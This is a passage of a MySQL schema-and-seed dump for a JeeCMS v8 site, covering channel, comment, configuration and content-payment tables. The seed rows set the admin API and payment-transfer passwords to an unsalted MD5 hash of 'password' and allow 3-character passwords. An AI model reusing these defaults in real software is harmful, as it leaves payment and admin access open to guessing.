  `allow_score` tinyint(1) NOT NULL DEFAULT 0 COMMENT '评分(true:开放;false:关闭)',
  `tpl_mobile_channel` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '手机栏目页模板',
  PRIMARY KEY (`channel_id`) USING BTREE,
  CONSTRAINT `fk_jc_ext_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS栏目内容表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_channel_ext
-- ----------------------------
INSERT INTO `jc_channel_ext` VALUES (75, '新闻', NULL, NULL, '0', '0', '0', '0', 10, NULL, NULL, NULL, '/WEB-INF/t/cms/www/default/channel/news.html', NULL, NULL, NULL, 0, 0, 510, 288, 310, 310, 0, 1, 0, NULL, NULL, NULL, 1, 1, '/WEB-INF/t/cms/www/mobile/channel/news.html');
INSERT INTO `jc_channel_ext` VALUES (76, '图库', NULL, NULL, '0', '0', '0', '0', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 510, 288, 310, 310, 0, 1, 0, NULL, NULL, NULL, 0, 0, '');
INSERT INTO `jc_channel_ext` VALUES (77, '视频', NULL, NULL, '0', '0', '0', '0', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 510, 288, 310, 310, 0, 1, 0, NULL, NULL, NULL, 0, 0, '');
INSERT INTO `jc_channel_ext` VALUES (78, '下载', NULL, NULL, '0', '0', '0', '0', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 139, 139, 310, 310, 0, 1, 0, NULL, NULL, NULL, 0, 0, '');
INSERT INTO `jc_channel_ext` VALUES (79, '招聘', NULL, NULL, '0', '0', '0', '0', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 139, 139, 310, 310, 0, 1, 0, NULL, NULL, NULL, 0, 0, '');
INSERT INTO `jc_channel_ext` VALUES (80, '网络调查', NULL, NULL, '0', '0', '0', '0', 10, NULL, NULL, NULL, '/WEB-INF/t/cms/www/default/alone/alone_survey.html', NULL, NULL, NULL, 0, 0, 139, 139, 310, 310, 0, 1, 0, NULL, NULL, NULL, 0, 0, '/WEB-INF/t/cms/www/mobile/alone/alone_survey.html.html');
INSERT INTO `jc_channel_ext` VALUES (82, '留言板', NULL, NULL, '0', '0', '0', '0', 10, NULL, NULL, '/guestbook.jspx', NULL, NULL, NULL, NULL, 0, 0, 139, 139, 310, 310, 0, 1, 0, NULL, NULL, NULL, 0, 0, '');
INSERT INTO `jc_channel_ext` VALUES (90, '系统软件', NULL, NULL, '0', '0', '0', '0', 10, NULL, NULL, NULL, '/WEB-INF/t/cms/www/default/channel/download_child.html', NULL, NULL, NULL, 1, 1, 139, 139, 310, 310, 0, 1, 0, NULL, NULL, NULL, 0, 0, '');
INSERT INTO `jc_channel_ext` VALUES (91, '媒体助手', NULL, NULL, '0', '0', '0', '0', 10, NULL, NULL, NULL, '/WEB-INF/t/cms/www/default/channel/download_child.html', NULL, NULL, NULL, 1, 1, 139, 139, 310, 310, 0, 1, 0, NULL, NULL, NULL, 0, 0, '');
INSERT INTO `jc_channel_ext` VALUES (92, '精品推荐', NULL, NULL, '0', '0', '0', '0', 10, NULL, NULL, NULL, '/WEB-INF/t/cms/www/default/channel/download_recommend.html', NULL, NULL, NULL, 0, 0, 139, 139, 310, 310, 0, 1, 0, NULL, NULL, NULL, 0, 0, '');
INSERT INTO `jc_channel_ext` VALUES (93, '游戏娱乐', NULL, NULL, '0', '0', '0', '0', 10, NULL, NULL, NULL, '/WEB-INF/t/cms/www/default/channel/download_child.html', NULL, NULL, NULL, 1, 1, 139, 139, 310, 310, 0, 1, 0, NULL, NULL, NULL, 0, 0, '');
INSERT INTO `jc_channel_ext` VALUES (94, '面试专栏', NULL, NULL, '0', '0', '1', '0', 20, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 139, 139, 310, 310, 3, 1, 0, NULL, NULL, NULL, 1, 1, NULL);

-- ----------------------------
-- Table structure for jc_channel_model
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_model`;
CREATE TABLE `jc_channel_model`  (
  `channel_id` int(11) NOT NULL,
  `model_id` int(11) NOT NULL COMMENT '模型id',
  `tpl_content` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容模板',
  `priority` int(11) NOT NULL DEFAULT 10 COMMENT '排序',
  `tpl_mobile_content` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '手机内容页模板',
  PRIMARY KEY (`channel_id`, `priority`) USING BTREE,
  INDEX `fk_jc_model_channel_m`(`model_id`) USING BTREE,
  CONSTRAINT `fk_jc_channel_model_c` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_model_channel_m` FOREIGN KEY (`model_id`) REFERENCES `jc_model` (`model_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '栏目可选内容模型表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_channel_model
-- ----------------------------
INSERT INTO `jc_channel_model` VALUES (75, 1, '/WEB-INF/t/cms/www/default/content/news2.html', 0, '/WEB-INF/t/cms/www/mobile/content/news.html');
INSERT INTO `jc_channel_model` VALUES (76, 5, '', 0, '');
INSERT INTO `jc_channel_model` VALUES (77, 6, '', 0, '');
INSERT INTO `jc_channel_model` VALUES (79, 8, '', 0, '');
INSERT INTO `jc_channel_model` VALUES (90, 4, '', 0, '');
INSERT INTO `jc_channel_model` VALUES (91, 4, '', 0, '');
INSERT INTO `jc_channel_model` VALUES (92, 4, '', 0, '');
INSERT INTO `jc_channel_model` VALUES (93, 4, '', 0, '');

-- ----------------------------
-- Table structure for jc_channel_txt
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_txt`;
CREATE TABLE `jc_channel_txt`  (
  `channel_id` int(11) NOT NULL,
  `txt` longtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '栏目内容',
  `txt1` longtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '扩展内容1',
  `txt2` longtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '扩展内容2',
  `txt3` longtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '扩展内容3',
  PRIMARY KEY (`channel_id`) USING BTREE,
  CONSTRAINT `fk_jc_txt_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS栏目文本表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_channel_user
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_user`;
CREATE TABLE `jc_channel_user`  (
  `channel_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`, `user_id`) USING BTREE,
  INDEX `fk_jc_channel_user`(`user_id`) USING BTREE,
  CONSTRAINT `fk_jc_channel_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_user_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS栏目用户关联表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_chnl_group_contri
-- ----------------------------
DROP TABLE IF EXISTS `jc_chnl_group_contri`;
CREATE TABLE `jc_chnl_group_contri`  (
  `channel_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`, `group_id`) USING BTREE,
  INDEX `fk_jc_channel_group_c`(`group_id`) USING BTREE,
  CONSTRAINT `fk_jc_channel_group_c` FOREIGN KEY (`group_id`) REFERENCES `jc_group` (`group_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_group_channel_c` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS栏目投稿会员组关联表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_chnl_group_contri
-- ----------------------------
INSERT INTO `jc_chnl_group_contri` VALUES (75, 1);
INSERT INTO `jc_chnl_group_contri` VALUES (76, 1);
INSERT INTO `jc_chnl_group_contri` VALUES (77, 1);
INSERT INTO `jc_chnl_group_contri` VALUES (79, 1);
INSERT INTO `jc_chnl_group_contri` VALUES (75, 2);
INSERT INTO `jc_chnl_group_contri` VALUES (76, 2);
INSERT INTO `jc_chnl_group_contri` VALUES (77, 2);
INSERT INTO `jc_chnl_group_contri` VALUES (79, 2);
INSERT INTO `jc_chnl_group_contri` VALUES (75, 3);
INSERT INTO `jc_chnl_group_contri` VALUES (76, 3);
INSERT INTO `jc_chnl_group_contri` VALUES (77, 3);
INSERT INTO `jc_chnl_group_contri` VALUES (79, 3);

-- ----------------------------
-- Table structure for jc_chnl_group_view
-- ----------------------------
DROP TABLE IF EXISTS `jc_chnl_group_view`;
CREATE TABLE `jc_chnl_group_view`  (
  `channel_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`, `group_id`) USING BTREE,
  INDEX `fk_jc_channel_group_v`(`group_id`) USING BTREE,
  CONSTRAINT `fk_jc_channel_group_v` FOREIGN KEY (`group_id`) REFERENCES `jc_group` (`group_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_group_channel_v` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS栏目浏览会员组关联表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_comment
-- ----------------------------
DROP TABLE IF EXISTS `jc_comment`;
CREATE TABLE `jc_comment`  (
  `comment_id` int(11) NOT NULL AUTO_INCREMENT,
  `comment_user_id` int(11) NULL DEFAULT NULL COMMENT '评论用户ID',
  `reply_user_id` int(11) NULL DEFAULT NULL COMMENT '回复用户ID',
  `content_id` int(11) NOT NULL COMMENT '内容ID',
  `site_id` int(11) NOT NULL COMMENT '站点ID',
  `create_time` datetime NOT NULL COMMENT '评论时间',
  `reply_time` datetime NULL DEFAULT NULL COMMENT '回复时间',
  `ups` smallint(6) NOT NULL DEFAULT 0 COMMENT '支持数',
  `downs` smallint(6) NOT NULL DEFAULT 0 COMMENT '反对数',
  `is_recommend` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否推荐',
  `is_checked` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否审核',
  `score` int(11) NULL DEFAULT NULL COMMENT '评分',
  `parent_id` int(11) NULL DEFAULT NULL COMMENT '父级评论',
  `reply_count` int(11) NULL DEFAULT 0 COMMENT '回复数',
  PRIMARY KEY (`comment_id`) USING BTREE,
  INDEX `fk_jc_comment_content`(`content_id`) USING BTREE,
  INDEX `fk_jc_comment_reply`(`reply_user_id`) USING BTREE,
  INDEX `fk_jc_comment_site`(`site_id`) USING BTREE,
  INDEX `fk_jc_comment_user`(`comment_user_id`) USING BTREE,
  CONSTRAINT `fk_jc_comment_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_comment_reply` FOREIGN KEY (`reply_user_id`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_comment_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_comment_user` FOREIGN KEY (`comment_user_id`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS评论表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_comment_ext
-- ----------------------------
DROP TABLE IF EXISTS `jc_comment_ext`;
CREATE TABLE `jc_comment_ext`  (
  `comment_id` int(11) NOT NULL,
  `ip` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'IP地址',
  `text` longtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '评论内容',
  `reply` longtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '回复内容',
  INDEX `fk_jc_ext_comment`(`comment_id`) USING BTREE,
  CONSTRAINT `fk_jc_ext_comment` FOREIGN KEY (`comment_id`) REFERENCES `jc_comment` (`comment_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS评论扩展表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_config
-- ----------------------------
DROP TABLE IF EXISTS `jc_config`;
CREATE TABLE `jc_config`  (
  `config_id` int(11) NOT NULL,
  `context_path` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '/JeeCms' COMMENT '部署路径',
  `servlet_point` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'Servlet挂载点',
  `port` int(11) NULL DEFAULT NULL COMMENT '端口',
  `db_file_uri` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '/dbfile.svl?n=' COMMENT '数据库附件访问地址',
  `is_upload_to_db` tinyint(1) NOT NULL DEFAULT 0 COMMENT '上传附件至数据库',
  `def_img` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '/JeeCms/r/cms/www/default/no_picture.gif' COMMENT '图片不存在时默认图片',
  `login_url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '/login.jspx' COMMENT '登录地址',
  `process_url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '登录后处理地址',
  `mark_on` tinyint(1) NOT NULL DEFAULT 1 COMMENT '开启图片水印',
  `mark_width` int(11) NOT NULL DEFAULT 120 COMMENT '图片最小宽度',
  `mark_height` int(11) NOT NULL DEFAULT 120 COMMENT '图片最小高度',
  `mark_image` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '/r/cms/www/watermark.png' COMMENT '图片水印',
  `mark_content` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT 'www.jeecms.com' COMMENT '文字水印内容',
  `mark_size` int(11) NOT NULL DEFAULT 20 COMMENT '文字水印大小',
  `mark_color` varchar(10) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '#FF0000' COMMENT '文字水印颜色',
  `mark_alpha` int(11) NOT NULL DEFAULT 50 COMMENT '水印透明度（0-100）',
  `mark_position` int(11) NOT NULL DEFAULT 1 COMMENT '水印位置(0-5)',
  `mark_offset_x` int(11) NOT NULL DEFAULT 0 COMMENT 'x坐标偏移量',
  `mark_offset_y` int(11) NOT NULL DEFAULT 0 COMMENT 'y坐标偏移量',
  `count_clear_time` date NOT NULL COMMENT '计数器清除时间',
  `count_copy_time` datetime NOT NULL COMMENT '计数器拷贝时间',
  `download_code` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT 'jeecms' COMMENT '下载防盗链md5混淆码',
  `download_time` int(11) NOT NULL DEFAULT 12 COMMENT '下载有效时间（小时）',
  `email_host` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '邮件发送服务器',
  `email_encoding` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '邮件发送编码',
  `email_username` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '邮箱用户名',
  `email_password` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '邮箱密码',
  `email_personal` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '邮箱发件人',
  `validate_type` int(2) NULL DEFAULT 0 COMMENT '验证类型：0:无  1：邮件验证  2：SMS验证',
  `view_only_checked` tinyint(1) NOT NULL DEFAULT 0 COMMENT '只有终审才能浏览内容页',
  `flow_clear_time` date NOT NULL COMMENT '流量统计清除时间',
  `channel_count_clear_time` date NOT NULL COMMENT '栏目发布内容计数器清除时间',
  `day_count` int(10) NULL DEFAULT 0 COMMENT '短信验证 每日验证次数限制',
  `smsid` bigint(20) NULL DEFAULT NULL COMMENT '配置了的短信运营商',
  PRIMARY KEY (`config_id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS配置表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_config
-- ----------------------------
INSERT INTO `jc_config` VALUES (1, '/menhu', NULL, 8082, '/dbfile.svl?n=', 0, '/r/cms/www/no_picture.gif', '/login.jspx', NULL, 0, 120, 120, '/jeecmsv8f/u/cms/www/201811/221444411zyq.jpg', 'www.jeecms.com', 40, '#FF0000', 100, 1, 0, 0, '2019-01-29', '2019-01-29 09:50:17', 'jeecms', 12, NULL, NULL, NULL, NULL, NULL, 0, 0, '2019-01-29', '2019-01-28', 0, NULL);

-- ----------------------------
-- Table structure for jc_config_attr
-- ----------------------------
DROP TABLE IF EXISTS `jc_config_attr`;
CREATE TABLE `jc_config_attr`  (
  `config_id` int(11) NOT NULL,
  `attr_name` varchar(30) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '名称',
  `attr_value` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '值',
  INDEX `fk_jc_attr_config`(`config_id`) USING BTREE,
  CONSTRAINT `fk_jc_attr_config` FOREIGN KEY (`config_id`) REFERENCES `jc_config` (`config_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS配置属性表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_config_attr
-- ----------------------------
INSERT INTO `jc_config_attr` VALUES (1, 'password_min_len', '3');
INSERT INTO `jc_config_attr` VALUES (1, 'username_reserved', '');
INSERT INTO `jc_config_attr` VALUES (1, 'register_on', 'true');
INSERT INTO `jc_config_attr` VALUES (1, 'member_on', 'true');
INSERT INTO `jc_config_attr` VALUES (1, 'username_min_len', '5');
INSERT INTO `jc_config_attr` VALUES (1, 'version', 'jeecms-v8');
INSERT INTO `jc_config_attr` VALUES (1, 'user_img_height', '98');
INSERT INTO `jc_config_attr` VALUES (1, 'user_img_width', '143');
INSERT INTO `jc_config_attr` VALUES (1, 'check_on', 'false');
INSERT INTO `jc_config_attr` VALUES (1, 'new_picture', '/r/cms/www/new.gif');
INSERT INTO `jc_config_attr` VALUES (1, 'day', '3');
INSERT INTO `jc_config_attr` VALUES (1, 'preview', 'false');
INSERT INTO `jc_config_attr` VALUES (1, 'qqEnable', 'false');
INSERT INTO `jc_config_attr` VALUES (1, 'sinaKey', '');
INSERT INTO `jc_config_attr` VALUES (1, 'sinaEnable', 'false');
INSERT INTO `jc_config_attr` VALUES (1, 'qqID', '101139646');
INSERT INTO `jc_config_attr` VALUES (1, 'qqKey', '');
INSERT INTO `jc_config_attr` VALUES (1, 'sinaID', '2510334929');
INSERT INTO `jc_config_attr` VALUES (1, 'qqWeboEnable', 'false');
INSERT INTO `jc_config_attr` VALUES (1, 'qqWeboKey', '');
INSERT INTO `jc_config_attr` VALUES (1, 'qqWeboID', '801526383');
INSERT INTO `jc_config_attr` VALUES (1, 'ssoEnable', 'false');
INSERT INTO `jc_config_attr` VALUES (1, 'flowSwitch', 'true');
INSERT INTO `jc_config_attr` VALUES (1, 'contentFreshMinute', '0');
INSERT INTO `jc_config_attr` VALUES (1, 'codeImgWidth', '160');
INSERT INTO `jc_config_attr` VALUES (1, 'codeImgHeight', '160');
INSERT INTO `jc_config_attr` VALUES (1, 'reward_fix_4', '4');
INSERT INTO `jc_config_attr` VALUES (1, 'reward_fix_1', '1');
INSERT INTO `jc_config_attr` VALUES (1, 'reward_fix_3', '3');
INSERT INTO `jc_config_attr` VALUES (1, 'reward_fix_2', '2');
INSERT INTO `jc_config_attr` VALUES (1, 'reward_fix_5', '5');
INSERT INTO `jc_config_attr` VALUES (1, 'reward_fix_6', '6');
INSERT INTO `jc_config_attr` VALUES (1, 'weixinAppId', '1212');
INSERT INTO `jc_config_attr` VALUES (1, 'weixinAppSecret', '121212');
INSERT INTO `jc_config_attr` VALUES (1, 'weixinLoginId', '1212');
INSERT INTO `jc_config_attr` VALUES (1, 'weixinLoginSecret', '121212');
INSERT INTO `jc_config_attr` VALUES (1, 'commentOpen', 'true');
INSERT INTO `jc_config_attr` VALUES (1, 'guestbookOpen', 'true');
INSERT INTO `jc_config_attr` VALUES (1, 'guestbookNeedLogin', 'true');
INSERT INTO `jc_config_attr` VALUES (1, 'guestbookDayLimit', '0');
INSERT INTO `jc_config_attr` VALUES (1, 'commentDayLimit', '0');
INSERT INTO `jc_config_attr` VALUES (1, 'apiAccountMngPassword', '5f4dcc3b5aa765d61d8327deb882cf99');

-- ----------------------------
-- Table structure for jc_config_content_charge
-- ----------------------------
DROP TABLE IF EXISTS `jc_config_content_charge`;
CREATE TABLE `jc_config_content_charge`  (
  `config_content_id` int(11) NOT NULL DEFAULT 1,
  `weixin_appid` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '微信服务号APPID',
  `weixin_secret` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '微信公众号secret',
  `weixin_account` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '微信支付商户号',
  `weixin_password` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '微信支付商户密钥',
  `alipay_partner_id` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '支付宝合作者ID',
  `alipay_account` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '支付宝签约账户',
  `alipay_key` varchar(1000) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '支付宝公钥',
  `alipay_appid` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '支付宝应用ID',
  `alipay_public_key` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '' COMMENT '支付宝RSA公钥',
  `alipay_private_key` varchar(1000) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '支付宝RSA私钥',
  `charge_ratio` double(5, 2) NOT NULL DEFAULT 0.00 COMMENT '抽成比例',
  `min_draw_amount` double(11, 2) NOT NULL DEFAULT 1.00 COMMENT '最小提现额',
  `commission_total` double(15, 4) NOT NULL DEFAULT 0.0000 COMMENT '佣金抽成总金额',
  `commission_year` double(15, 4) NOT NULL DEFAULT 0.0000 COMMENT '佣金抽成年金额',
  `commission_month` double(15, 4) NOT NULL DEFAULT 0.0000 COMMENT '佣金抽成月金额',
  `commission_day` double(15, 4) NOT NULL DEFAULT 0.0000 COMMENT '佣金抽成日金额',
  `last_buy_time` timestamp NULL DEFAULT NULL COMMENT '最后购买时间',
  `pay_transfer_password` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '5f4dcc3b5aa765d61d8327deb882cf99' COMMENT '转账支付密码（管理后台验证）',
  `transfer_api_password` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '企业转账接口API密钥',
  `reward_min` double(11, 2) NOT NULL DEFAULT 0.00 COMMENT '打赏随机数最小值',
  `reward_max` double(11, 2) NOT NULL DEFAULT 0.00 COMMENT '打赏随机数最小值',
  `reward_pattern` tinyint(1) NOT NULL DEFAULT 0 COMMENT '打赏模式(0随机 1固定)',
  PRIMARY KEY (`config_content_id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '内容收费配置' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_config_content_charge
-- ----------------------------
INSERT INTO `jc_config_content_charge` VALUES (1, '1', '2', '3', '4', '1', '1', '1', '1', '1', '1', 0.10, 1.00, 0.0000, 0.0000, 0.0000, 0.0000, '2016-10-11 11:40:48', '5f4dcc3b5aa765d61d8327deb882cf99', '4', 0.01, 1.00, 0);

-- ----------------------------
-- Table structure for jc_config_item
-- ----------------------------
DROP TABLE IF EXISTS `jc_config_item`;
CREATE TABLE `jc_config_item`  (
  `modelitem_id` int(11) NOT NULL AUTO_INCREMENT,
  `config_id` int(11) NOT NULL,
  `field` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '字段',
  `item_label` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT 70 COMMENT '排列顺序',
  `def_value` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '默认值',
  `opt_value` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '可选项',
  `text_size` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '长度',
  `area_rows` varchar(3) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '文本行数',
  `area_cols` varchar(3) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '文本列数',
  `help` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '帮助信息',
  `help_position` varchar(1) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '帮助位置',
  `data_type` int(11) NOT NULL DEFAULT 1 COMMENT '数据类型 \"1\":\"字符串文本\",\"2\":\"整型文本\",\"3\":\"浮点型文本\",\"4\":\"文本区\",\"5\":\"日期\",\"6\":\"下拉列表\",\"7\":\"复选框\",\"8\":\"单选框\"',
  `is_required` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否必填',
  `category` int(11) NOT NULL DEFAULT 1 COMMENT '模型项目所属分类（1注册模型）',
  PRIMARY KEY (`modelitem_id`) USING BTREE,
  INDEX `fk_jc_item_config`(`config_id`) USING BTREE,
  CONSTRAINT `fk_jc_item_config` FOREIGN KEY (`config_id`) REFERENCES `jc_config` (`config_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS配置模型项表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_content
-- ----------------------------
DROP TABLE IF EXISTS `jc_content`;
CREATE TABLE `jc_content`  (
  `content_id` int(11) NOT NULL AUTO_INCREMENT,
  `channel_id` int(11) NOT NULL COMMENT '栏目ID',
  `user_id` int(11) NOT NULL COMMENT '用户ID',
  `type_id` int(11) NOT NULL COMMENT '属性ID',
  `model_id` int(11) NOT NULL COMMENT '模型ID',
  `site_id` int(11) NOT NULL COMMENT '站点ID',
  `sort_date` datetime NOT NULL COMMENT '排序日期',
  `top_level` tinyint(4) NOT NULL DEFAULT 0 COMMENT '固顶级别',
  `has_title_img` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否有标题图',
  `is_recommend` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否推荐',
  `status` tinyint(4) NOT NULL DEFAULT 2 COMMENT '状态(0:草稿;1:审核中;2:审核通过;3:回收站;4:投稿;5:归档)',
  `views_day` int(11) NOT NULL DEFAULT 0 COMMENT '日访问数',
  `comments_day` smallint(6) NOT NULL DEFAULT 0 COMMENT '日评论数',
  `downloads_day` smallint(6) NOT NULL DEFAULT 0 COMMENT '日下载数',
  `ups_day` smallint(6) NOT NULL DEFAULT 0 COMMENT '日顶数',
  `score` int(11) NOT NULL DEFAULT 0 COMMENT '得分',
  `recommend_level` tinyint(4) NOT NULL DEFAULT 0 COMMENT '推荐级别',
  PRIMARY KEY (`content_id`) USING BTREE,
  INDEX `fk_jc_content_site`(`site_id`) USING BTREE,
  INDEX `fk_jc_content_type`(`type_id`) USING BTREE,
  INDEX `fk_jc_content_user`(`user_id`) USING BTREE,
  INDEX `fk_jc_contentchannel`(`channel_id`) USING BTREE,
  INDEX `fk_jc_content_model`(`model_id`) USING BTREE,
  INDEX `index_jc_content_top_level_sort`(`top_level`, `sort_date`) USING BTREE,
  INDEX `index_jc_content_status`(`status`) USING BTREE,
  INDEX `index_jc_content_sort_date`(`sort_date`) USING BTREE,
